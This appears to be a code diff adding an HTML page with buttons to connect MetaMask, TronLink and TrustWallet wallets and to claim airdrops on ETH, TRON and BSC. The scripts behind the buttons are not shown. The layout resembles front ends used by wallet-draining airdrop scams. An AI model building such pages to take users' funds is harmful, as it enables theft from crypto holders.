@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Integration</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+</head>
+<body>
+
+<h1>Connect your Wallet</h1>
+<button id="connectButton">Connect MetaMask</button>
+<button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
+<button id="connectTronlinkButton">Connect TronLink</button>
+<button id="claimTronAirdropButton" disabled>Claim Airdrop (TRON)</button>
+<button id="connectTrustwalletButton">Connect TrustWallet</button>
+<button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
+
+<script src="js/common.js"></script> 
+<script src="js/metamask-deeplink.js"></script> <!-- For mobile MetaMask -->
+</body>
+</html>
